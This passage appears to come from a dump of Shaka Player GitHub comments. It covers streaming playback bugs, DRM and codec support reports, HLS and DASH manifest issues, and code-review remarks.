inside a buffered range is too aggressive. It assumes that if the media is \"playing\" but has had a playback rate of 0 for more than a second straight, the video has stalled. Maybe on slow hardware, like on Chromecasts, it simply sometimes takes more than one second to seek sometimes, so we are assuming the stream has stalled prematurely?\nYou can send details on reproduction to shaka-player-issues@google.com.. To be clear, there are some ideas we could try, but we will need to be able to test them to be sure they actually solve the problem.. Ok, I was able to reproduce the problem with a (short) custom manifest. This change solves the problem on that custom manifest; I haven't tested the fix on your sample. I'll try it later, or you can try it yourself if you want. I won't close the issue until I know it's an actual fix.. We plan on gathering more thorough data on platform-specific gap behavior in the future. Hopefully that will help us better account for V1 Chromecasts, and other platforms with weak hardware.\nI can write a CL for a configurable gap threshold, in the meantime, and see what the rest of the team thinks. That'd be straightforward enough.. You should put that configuration after creating the player, but before loading.\nSo, as you said you were following the tutorial, you could end up with something like...\n```js\nfunction initPlayer() {\n  // Create a Player instance.\n  var video = document.getElementById('video');\n  var player = new shaka.Player(video);\n// Configure to add a clock sync uri.\n  player.configure(\n      'manifest.dash.clockSyncUri',\n      'https://shaka-player-demo.appspot.com/time.txt');\n// Attach player to the window to make it easy to access in the JS console.\n  window.player = player;\n// Listen for error events.\n  player.addEventListener('error', onErrorEvent);\n// Try to load a manifest.\n  // This is an asynchronous process.\n  player.load(manifestUri).then(function() {\n    // This runs if the asynchronous load is successful.\n    console.log('The video has now been loaded!');\n  }).catch(onError);  // onError is executed if the asynchronous load fails.\n}\n```. I don't know if we can diagnose this problem without having a way to reproduce it. Just the manifest is typically not enough. So it'd be helpful if you could give us an URI we could use to play the stream on our end, and see the problem. You can send it to shaka-player-issues@google.com if you don't want it to be known publicly.. Are you referring to something like CMAF low-latency mode? We have an issue for that on our backlog, #1525.. All of the Verizon Digital Media Services assets seem to be un-storable. Odd. I'll look into it.. Ok, this CL will mark which assets are storable online and which aren't. It's just a field in the asset structure, so it won't be able to tell for custom assets, but it should prevent more misunderstandings in the future.. According to the MPEG-DASH ISO/IEC 23009-1:2014 (which is available here), in section 5.3.5.2, about a representation's id:\n\nThe identifier shall be unique within a Period unless the Representation is functionally identically to another Representation in the same Period.\n\nSo having two representations with the same ID is only valid if those representations are the same; presumably, in that case, the proper behavior is for the application to just ignore the duplicates, but I'd need to read more to figure that out. I don't think that we account for that case. If it's really important for you, submit a feature request and we'll consider it.\nOtherwise, no, it's not valid. It might make sense from an XML point of view, sure, but the committee in charge of making the spec decided that it would not be valid behavior. It simplifies implementation for applications, as they can store representations in lists indexed by ID, among other things.. You'll need to fix your content, yes. On live content, we need the representation id to know how to update properly; when adding in the changes from the new version of the manifest, it lets us know which representations from the old manifest correspond to which representations from the new manifest. If there are duplicate representation ids, we could end up combining representations together.. Thanks for the typo fix! I try to catch what I can, but I must have missed this one.. Looks like the cast button on the UI got broken during a refactoring. I have a CL out to fix it.. Does this change fix your problem? If not, I'll be happy to look into any further issues.. Glad to have helped.. The error \"Cannot compute timeline live edge without start time\" happens when availabilityStartTime is not provided. The other error, about it not matching our model, also comes from the same problem. Your manifest obviously does contain availabilityStartTime, though, so I'm not quite sure what the problem could be just by looking at it.\nIt'd help if I could see this problem myself. Can you provide a manifest URI so I can try to reproduce this? You can send it to shaka-player-issues@google.com if it's not public information.. We don't support playback on iOS at the moment, as iOS browsers do not have the MediaSource framework that we are based on. #997 is currently in progress; we're hoping for it to be done by the end of March, but it's a complicated enough change that that's not a guarantee.. We don't really have troubles with feature detection, no. And we try not to add third-party dependencies unless absolutely necessary, to keep our size down.. I tried the provided stream out on a Chromecast v1 in the newest version. Sometimes, it's able to play fine for a while, but eventually falls behind and gets stuck in eternal buffering. Other times, it gets stuck in eternal buffering from the start.\nWe perennially run into these kinds of issues; the hardware on v1 Chromecasts is pretty slow.. Okay, I think this looks good now. Thanks for the PR!. Shaka Player does not currently support iOS browsers at all; see issue #997. We hope to have that done by the end of March, but no guarantees.\nI don't know if downloading will be supported then, offhand. According to MDN, IndexedDB is supported on iOS, so it'd be possible.. Trying this out, it looks like when using the fetch plugin it errors whenever the URL is the \"beacon\" URL, as you mentioned. Interestingly, when the fetch plugin is disabled and we use XHR plugin, it gives a CORS error no matter what the URL is. More investigation will be required.. The fact that the fetch plugin is succeeding in situations where the XHR plugin gets a CORS error suggests that one or both of them has some kind of bug in it. They should ideally have the same behavior. Said bug may or may not be related to this issue, however.. In that case, you can set streaming.bufferingGoal to Infinity, and it will buffer to the end of the video. Do note that this could result in the player wasting a lot of bandwidth if, say, the user changes languages or something, and the player ends up re-downloading everything. So probably not great on mobile.. If network conditions change it might potentially adapt, yes. Since you are buffering a long time ahead, that might mean that a short dip in network bandwidth could lead to a few low-quality segments showing up minutes later.. We are updating things to ES6 slowly, and we will soon disallow \"var\". Could you change this to \"let\"?. There are a bunch of \"var\" in here too.. I don't know if this could be anything but a shaka.util.Error. This is catching thrown errors from makeResponse, which only throws an error in one place, and that's a shaka.util.Error. Nothing else in that function is something that could throw by itself, I don't think.. All of our licenses have to say copyright 2016.\nBecause if the licenses are different, the closure compiler will copy every different version into the compiled file, which will bloat it pointlessly. Also, there might be a legal reason? I forget.. How does PiP interact with our Chromecast support, anyway? I don't see any code that disables the PiP button when we are casting, and the .less doesn't hide it either. Well, that's a little outside of the scope of this CL, I guess.. Nit: The JSDoc lines past the / should be indented by one space, so that the * align with the first * in /.. Nit: Here too.. Nit: Here too.. Nit: Here too.. Nit: Here too.. Could you move attributeRegex to here, so no unrelated code is between it being declared and it being used?. A bit below this, Tag has a \"toString\" method. That method was also made assuming that tags cannot have both values and attribute lists. It should also be updated to account for this change.\nCorrespondingly, there's also a few simple tests for \"toString\" in the manifest text parser unit tests. There should be a new test for attribute+value tags in that.. This is confusingly worded. I think it'd be clearer like...\n\nEverything after ':' is a list of comma-separated items.\n2a. The first item might be a value, if it does not contain '='.\n2b. Otherwise, items are attributes.. Yeah, it's just personal preference. I don't even know if the rest of the team would agree with me, but I'm the first responder so I get to make the calls.. \n",
    "avelad": "Note: Microsoft Edge also supports MPEG2-TS natively\nThere will be support for Playready (Edge and Chromecast) and Fairplay (Safari)?\n. So, HLS+Playready will work on Edge(IE has not support for MPEG2-TS without transmuxing)?\n. HLS supports Fragmented MP4 \u2013 and gets MPEG-DASH compatible! https://bitmovin.com/hls-news-wwdc-2016/\n. There will be support for..\nCEA-608?\nHLS + AES?\nHLS + FairPlay(#382)?\nLive and VoD profiles?\nWhat version of HLS (4,5,6,7,..)?\n. Hi @ismena, could you add support for m4s? I checked this stream: https://bitdash-a.akamaihd.net/content/MI201109210084_1/m3u8s-fmp4/f08e80da-bf1d-4e3d-8899-f0f6155f6efa.m3u8 and I get \"Shaka Error MANIFEST.HLS_COULD_NOT_GUESS_MIME_TYPE (m4s)\"\nSource of stream: https://bitmovin.com/hls-fragmented-mp4/. Safari 11, now it's in beta with macOS High Sierra. Are there any change on eme-fairplay?\nShaka Player support.html reports:\n\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.21 (KHTML, like Gecko) Version/11.0 Safari/604.1.21\nv2.1.3\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": true,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": true,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": true,\n    \"video/webm; codecs=\\\"vp8\\\"\": false,\n    \"video/webm\": false,\n    \"video/webm; codecs=\\\"vp9\\\"\": false,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": false,\n    \"audio/webm\": false,\n    \"audio/webm; codecs=\\\"opus\\\"\": false,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp2t\": true,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": true,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": true,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": true,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": null,\n    \"com.widevine.alpha\": null,\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n\nIn MAC OSX El capitan reports:\n\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\nv2.1.3\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": true,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": true,\n    \"video/webm; codecs=\\\"vp8\\\"\": false,\n    \"video/webm\": false,\n    \"video/webm; codecs=\\\"vp9\\\"\": false,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": false,\n    \"audio/webm\": false,\n    \"audio/webm; codecs=\\\"opus\\\"\": false,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp2t\": true,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": true,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": true,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"com.apple.fps.1_0\": {\n      \"persistentState\": true\n    },\n    \"com.apple.fps\": {\n      \"persistentState\": true\n    },\n    \"org.w3.clearkey\": null,\n    \"com.widevine.alpha\": null,\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}. @chrisfillmore with this change, can you use com.apple.fps.2_0 without problems?. Hi @joeyparrish , can you schedule it in v2.3 milestone?. @joeyparrish any updates on this?. Hi,\n\nWith Safari Technology Preview 57 there are a change that could be impact on Fairplay support \"Enabled the modern EME API by default\"\nhttps://developer.apple.com/safari/technology-preview/release-notes/. Go!! channels name is perfect\n. @joeyparrish , do you have any update about this?. ExoPlayer is using the value attribute for audioChannel: https://github.com/google/ExoPlayer/blob/release-v2/library/dash/src/main/java/com/google/android/exoplayer2/source/dash/manifest/DashManifestParser.java#L708-L717\nAnd a pull request of DolbyLaboratories (https://github.com/google/ExoPlayer/pull/3085) is using the same (https://github.com/DolbyLaboratories/ExoPlayer/blob/a9062ff28378734c0bab7086a6c7664554c37a79/library/dash/src/main/java/com/google/android/exoplayer2/source/dash/manifest/DashManifestParser.java#L689-L700). Sample streams:\nhttp://dash.edgesuite.net/akamai/bbb_30fps/bbb_with_tiled_thumbnails.mpd\nhttp://dash.edgesuite.net/akamai/bbb_30fps/bbb_with_4_tiles_thumbnails.mpd\nhttp://dash.edgesuite.net/akamai/bbb_30fps/bbb_with_tiled_thumbnails_2.mpd\nhttp://dash.edgesuite.net/akamai/bbb_30fps/bbb_with_multiple_tiled_thumbnails.mpd\nhttp://vm2.dashif.org/livesim-dev/testpic_2s/Manifest_thumbs.mpd. I think that it's not working on master branch.\nI tested with mpd with stpp subtitles and external track webvtt.\nWith:\nplayer.load(asset.manifestUri, parseInt(position)).then(function() {\n        (asset.extraText || []).forEach(function(extraText) {\n          player.addTextTrack(extraText.uri, extraText.language, extraText.kind,\n                              extraText.mime, extraText.codecs)\n        })\n      }, function(reason) {\nI can not see the subtitles and in the console I see \"{category: 2, code: 2004, data: Array[0]} TEXT --> BAD_ENCODING 2004\"\nand adding a timeout:\nplayer.load(asset.manifestUri, parseInt(position)).then(function() {\n        setTimeout(function() {\n          (asset.extraText || []).forEach(function(extraText) {\n            player.addTextTrack(extraText.uri, extraText.language, extraText.kind,\n                                extraText.mime, extraText.codecs)\n          })\n        }, 1000)\n      }, function(reason) {\nI can see the subtitles but in console I see: \"Uncaught (in promise) r {category: 3, code: 3015, data: Array[1]}\". Affter test the latest commit, it's not working with this stream: https://cdn.demo.anevia.com/live/eds/Arte/HLS-MP4/Arte.m3u8\nI get: \n\"Error: Shaka Error MANIFEST.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME ()\n    at new shaka.util.Error (http://localhost:8000/lib/util/error.js:72:13)\n    at shaka.hls.HlsParser. (http://localhost:8000/lib/hls/hls_parser.js:1244:17)\n    at \"\nThe error occurred parsing a webvtt file.. @joeyparrish, with this stream https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://cdn.demo.anevia.com/live/nas40/Arte/mirada_test/Arte.m3u8;lang=es and https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://cdn.demo.anevia.com/live/eds/Arte/HLS-MP4/Arte.m3u8;lang=es I see infinite loading only.. Thanks @joeyparrish . I raised https://github.com/google/shaka-player/issues/1102\nAbout the second stream (HLS-MP4: https://cdn.demo.anevia.com/live/eds/Arte/HLS-MP4/Arte.m3u8 ), what is the problem?. I have this information about this problem:\n\nThis is a special update to provide early notification of upcoming changes to the Widevine CDM client scheduled to ship with Chrome 58. This update is live and ready to test on the Chrome beta channel. \nPlease contact us for any issues.\nWhat\u2019s Changing\nChrome 58 will introduce a new CDM security feature known as Verified Media Path (VMP).  VMP requires the use of a service certificate.\nPrior to Chrome 58, service certificate requests were only made when certain EME options were enabled (e.g. persistentState, distinictiveIdentifier).\nWith the addition of VMP in Chrome 58, a service certificate is now required.  If a service certificate does not exist, a certificate request will be initiated prior to every license request.\nWhen?\nScheduled for April 25 2017\nWhich Platforms?\nChrome on Desktop and Android starting from version 58\nWhat do I need to do?\nLicense Proxy\nA service certificate request will precede each license request.\nAs a result, expect an increase of traffic at your proxy service.\nService certificate requests are smaller in size (2-4 bytes) compared to a license request and must be forwarded as-is (unchanged) to the Widevine Cloud License Service.\nLicense Server SDK\nPlease ensure that the SDK is initialized with the service certificate as documented on page 7 in our SDK API doc (for Java, it's in WvPLEnvironment.setServiceCertificate).\nThe service certificate returned to the client will match the service certificate initialized by the SDK.  These service certificates must match to allow the browser client to accept licenses from the SDK.\nChrome Browser\nThe browser player application must set the service certificate to prevent a certificate request for each CDM session.\nSetting the service certificate to the application can be accomplished by using the EME\u2019s setServiceCertificate API with the following considerations:\nsetServiceCertificate should be called after the MediaKeys object is created, but before creating sessions with mediaKeys.createSession(...).\nThe argument type is a BufferSource, which means either an ArrayBuffer or a Uint8Array will be accepted.  A hex-encoded or base64-encoded string will not be accepted.\nThe method returns a Promise that is resolved or rejected when the operation is complete.  Sessions should be created after the Promise resolves.\nShaka Player\nShaka Player already supports calling this method at \nhttps://github.com/google/shaka-player/blob/ac46792/lib/media/drm_engine.js#L261\nAn example on how Shaka Player can be configured to set service certificate is as follows:\nvar serverCertificate = new Uint8Array(...);\nplayer.configure({\n  drm: {\n    advanced: {\n      'com.widevine.alpha': {\n        serverCertificate: serverCertificate\n      }\n    }\n  }\n});\nTroubleshooting\nIf you are receiving INVALID_LICENSE_CHALLENGE errors, review the internal_status code field.  A 134 or 139 translates to service certificate requests that have gone unfulfilled.\nExample of an error:\njson\n{\n    \"status\": \"INVALID_LICENSE_CHALLENGE\",\n    \"supported_tracks\": [],\n    \"internal_status\": 134,\n    \"client_info\": []\n}\nYou will need to ensure that your license proxy is passing the service certificate request through for fulfillment by the Cloud License Service.\nBest,\nThe Widevine team. @theodab, I sent you an email with the source code and video with the problem. I hope that help, if not contact me.. @theodab , thanks for all. I'll check the changes and I tell you if it works (I need some days).. hi @theodab , I just tested the latest commit, and it works perfectly!!! Do you think that it's possible make a cherry-pick to 2.2.3?. Hi @joeyparrish ,\n\nI suspect that Samsung implementation has any error on Promises or EME API. Let me check anf I'll back with any news\nPlease do not close the issue even if it takes a week to respond.. With Tizen TV emulator ClearKey works.\nAfter check the Samsung Forum, I found http://developer.samsung.com/forum/thread/are-html5-mse-and-eme-supported-by-tizen/201/306261?boardName=SDK&startId=zzzzz~\nI think that the problem it's the EME implementation of Samsung.\nThe problem probably is related to: https://github.com/google/shaka-player/issues/752#issuecomment-293054809 with Tizen 3.0, Samsung changes to V8 and update EME implementation...\n. Tizen 2.4 is based on EME v0.1b (non-object-oriented) with a webkit prefix same a Safari.\nTizen 3.0 works with current polyfill (ClearKey on emulator and ClearKey /Widevine on TV).\nAccording to http://developer.samsung.com/tv/develop/specifications/general-features, Samsung Smart TV 2016 uses Tizen 2.4 and Samsung Smart TV 2017 uses TIzen 3.0\nNote:\nTizen 2.4 uses JSC as javascript engine. \nTizen 3.0 uses V8 as javascript engine.. @vaage , Do you have any updates about it?. Yes, I want that you add com.microsoft.playready.hardware to probeSupport().With this I can set one or other url to the player (eg: 720p url or 2K/4K url). Add this to probeSupport should be easy, can you add it to 2.1.2 or 2.2.0?\nI think that second option it's better but it's require more work. In this case it's necessary active this with a parameter on the config.. I do not know what values are possible, in the past I could not find any value that works, and the documentation is not clear.\nI'm sure that Netflix knows the solution for this, because they have been implemented logic for 4K with high level of protection only on Edge, but I do not know the logic.\nI thought a possible solution was to use probeSupport() and check if there are compability with hvc1 and com.microsoft.playready.hardware. With this, we load a stream that use com.microsoft.playready. @joeyparrish is it possible add support to com.microsoft.playready.hardware key system?. It's a very simple mechanism. Each segement is encrypted with a key, for get this key only it's necessary get the response of license request of URI.\nIn the initial sample:\n```\nEXT-X-KEY:METHOD=AES-128,URI=\"oceans.key\"\nEXTINF:11, no desc\noceans_aes-audio=65000-video=236000-1.ts\n```\nThe response of \"oceans.key\" is \"\u00f5q\u00bf\u00ec\u00fd\u001a\u00b9\u00ad\u00b0\\\u00e6\u00fa\u000e\u00fd\u0081\"\nWith this key, you can descrypt the segments. \nA interesting article about that:\nhttps://www.theoplayer.com/blog/content-protection-for-hls-with-aes-128-encryption\nSample:\nhttps://tools.ietf.org/html/draft-pantos-http-live-streaming-13#section-8.4. I found that videojs uses https://github.com/videojs/aes-decrypter \ns it possible to use it like mux.js?. I just tested the functionality in the master branch, but it's not working with all TS playlists.\nTested in: \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36\"\nSamples:\n1) https://content.jwplatform.com/manifests/vM7nH0Kl.m3u8 or https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://content.jwplatform.com/manifests/vM7nH0Kl.m3u8;lang=es\n2) http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097.m3u8 or https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097.m3u8;lang=es (enable mixed content to test)\n. Sorry, I forget the geoblocking...  You need use a query string parameter in master and media playlist (?vu=12345) http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097.m3u8?vu=12345\nMaster playlist (http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097.m3u8?vu=12345)\n```\nEXTM3U\nEXT-X-VERSION:4\nEXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"Audio\",NAME=\"Spanish\",DEFAULT=NO,AUTOSELECT=YES,LANGUAGE=\"spa\",URI=\"ATEME_HLS_P_DLVY5849991423000097_audio_spa_96kbps.m3u8\"\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=337000,CODECS=\"avc1.42E020,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_200kbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=97000,CODECS=\"mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_audio_spa_96kbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=759000,CODECS=\"avc1.42E020,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_600kbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1394000,CODECS=\"avc1.42E020,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_1.2Mbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=2028000,CODECS=\"avc1.640020,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_1.8Mbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=97000,CODECS=\"mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_audio_spa_96kbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=3495000,CODECS=\"avc1.640020,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_3.2Mbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=4658000,CODECS=\"avc1.640029,mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=97000,CODECS=\"mp4a.40.5\",AUDIO=\"Audio\"\nATEME_HLS_P_DLVY5849991423000097_audio_spa_96kbps.m3u8\n```\nMedia playlist (http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.m3u8?vu=12345)\n```\nEXTM3U\nEXT-X-VERSION:3\nEXT-X-TARGETDURATION:11\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5534908&offset=0\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5651844&offset=5534908\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5566492&offset=11186752\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5430004&offset=16753244\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5582660&offset=22183248\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5605220&offset=27765908\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5391276&offset=33371128\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5563484&offset=38762404\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5524944&offset=44325888\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5608040&offset=49850832\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5707116&offset=55458872\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5241064&offset=61165988\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5567056&offset=66407052\nEXTINF:10,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=5566492&offset=71974108\nEXTINF:3,\nATEME_HLS_P_DLVY5849991423000097_video_4.3Mbps.ts?length=1385748&offset=77540600\nEXT-X-ENDLIST\n```\nI think that the problem is related to mime type or content extension with query params.. Thanks @ismena. I'm interested on a custom plugin to display styled text. Once it is possible, can you indicate the steps to follow?\n. @ismena, I have seen your commits, but I do not see support for tts:direction = ( 'ltr' | 'rtl' ), is it intentional?. @ismena \nSpecs:\ntts:writingMode --> https://www.w3.org/TR/ttaf1-dfxp/#style-attribute-writingMode\ntts:direction --> https://www.w3.org/TR/ttaf1-dfxp/#style-attribute-direction\nI think that direction attribute has a direct translation to css with https://www.w3schools.com/cssref/pr_text_direction.asp and writingMode attribute allow the same as direction atribute plus vertical modes.\nSome packagers use direction attribute for use in the same stream arabic and english for example.\n. @ismena do you have any update about my previous comment?. @joeyparrish With the attached zip (included a patch for git), it's enough for this issue.\n944.patch.zip\nMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36\nv2.1.0-141-g4496f53-dirty\n```\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n```. @joeyparrish, there are not nothing special, load the assets and open the info section. \nI deleted the browser cache and the issue remains\nNote: I can reproduce the error on Chrome v60 also.. I just tested and it works perfectly, Thanks!. Are there release date for v2.2.1?. @beaufortfrancois You can access to nightly build in: https://nightly-dot-shaka-player-demo.appspot.com/demo/. @joeyparrish, what are the problems exactly?. Version 62 has already been released. The problems have been fixed?. @joeyparrish Is it possible include this change in 2.4.4?. @joeyparrish , can you look it?. @joeyparrish , I like your refinement! Right now there is already version 2.4.0, can you schedule it?. hi @michellezhuogg, @joeyparrish  I just tested in Safari and Tizen (both with support for aac and ac-3) and the change is not working properly.\nIf the content is multicodec (eg: https://devstreaming-cdn.apple.com/videos/streaming/examples/img_bipbop_adv_example_fmp4/master.m3u8 sample of Apple (the has not cors enabled, use developer settings for disable it))\nIn the player load function (https://github.com/google/shaka-player/blob/master/lib/player.js#L676), chooseCodecsAndFilterManifest_ (https://github.com/google/shaka-player/blob/master/lib/player.js#L773) is called before of filterVariantsByConfig (https://github.com/google/shaka-player/blob/master/lib/player.js#L797)\nEven if preferredAudioChannelCount = 6 is used, it is not possible to use the 5.1 variant with 6 channels.\nCan you review it?. @joeyparrish , is it possible add  configuration of preferredAudioChannelCount to Demo App?. @joeyparrish , the configuration in Demo app is failing:\n\n. I'm reviewing the last 